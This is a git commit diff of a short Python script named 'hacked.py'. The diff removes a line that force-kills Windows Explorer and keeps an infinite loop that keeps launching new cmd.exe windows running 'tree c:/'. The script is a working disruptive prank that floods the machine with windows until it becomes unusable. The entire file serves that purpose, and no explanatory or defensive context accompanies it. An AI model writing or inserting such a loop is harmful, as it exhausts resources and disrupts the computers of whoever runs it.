e1f7115756d4d5939f064cdf92320eec14f8bf55
irwan fakhrurrozi <arrozy01.23@gmail.com>
2022-10-07 17:02:41 +0800

    Update hacked.py

--- hacked.py
+++ hacked.py
@@ -1,9 +1,5 @@
 import os
-import time
-
 
 def tes():
-    os.system("taskkill /f /t /im explorer.exe")
     while True:
-        # os.system('start C:\Windows\System32\cmd.exe /K \"tree c:/" ')
-        os.system("start tree c:/")
+        os.system('start C:\Windows\System32\cmd.exe /K \"tree c:/" ')
